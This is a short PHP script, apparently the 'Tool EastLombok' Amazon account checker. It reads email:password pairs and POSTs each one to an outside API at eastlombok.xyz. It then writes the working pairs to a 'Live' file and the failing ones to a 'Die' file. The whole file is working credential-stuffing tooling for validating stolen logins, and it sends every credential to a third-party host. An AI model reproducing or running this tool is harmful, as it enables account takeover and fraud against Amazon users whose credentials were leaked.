<?php 

$namaOutputLive = "Rasult/".date('Y-m-d').'-Live-Amazon.txt';
$namaOutputDie = "Rasult/".date('Y-m-d').'-Die-Amazon.txt';
$namaOutputDbug = "config/dbug.txt";
$namaOutputDbugLive = "config/dbugLive.txt";
$namaOutputDbugDie = "config/dbugDie.txt";
$token = file_get_contents("token.txt");
$split = explode(":", $argv[1]);
$email = $split[0];
$password = $split[1];
$call = checker($email,$password,$token);
if ($call["msg"] == "api key is wrong") {
	tulis("dbug", "[401] Api key is wrong", $namaOutputDbug);
}else if( $call["msg"] == "something wrong, check endpoint!" ){
	tulis("dbug", "[401] Something Wrong, Check Endpoint Api!", $namaOutputDbug);
}else if($call["msg"] == "ok"){
	if ($call["data"]["status"] == "Live") {
		tulis("live", $argv[1], $namaOutputLive);
		tulis("dbug", "[Live]$argv[1]", $namaOutputDbug);
		tulis("dbug", "[Live]$argv[1]", $namaOutputDbugLive);
	}else{
		tulis("die", $argv[1], $namaOutputDie);
		tulis("dbug", "[Die]$argv[1]", $namaOutputDbug);
		tulis("dbug", "[Die]$argv[1]", $namaOutputDbugDie);
	}
}


function checker($email,$password,$token){
	$curl = curl_init();

	curl_setopt_array($curl, array(
		CURLOPT_URL => "http://eastlombok.xyz/restApi/api.php?check=amazon&key=$token&tipe=valid",
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_ENCODING => "",
		CURLOPT_MAXREDIRS => 10,
		CURLOPT_TIMEOUT => 0,
		CURLOPT_FOLLOWLOCATION => true,
		CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
		CURLOPT_CUSTOMREQUEST => "POST",
		CURLOPT_POSTFIELDS => array('email' => "$email", 'password' => "$password"),
	));

	$response = curl_exec($curl);
	$decode = json_decode($response, true);
	curl_close($curl);
	return $decode;
}

function tulis($tipe, $data = null, $path){
	if ($tipe == "copret") {
		$namaFile = $path;
		$file = fopen($namaFile, "a");
		fwrite($file, "================Tool EastLombok===============\n=====created by: sayidina ahmadal qoqosyi=====\n\n");
		fclose($file);
	}else if($tipe == "dbug"){
		$namaFile = $path;
		$file = fopen($namaFile, "a");
		fwrite($file, "$data\n");
		fclose($file);
	}else{
		$namaFile = $path;
		$file = fopen($namaFile, "a");
		fwrite($file, $data."\n");
		fclose($file);
	}
}


?>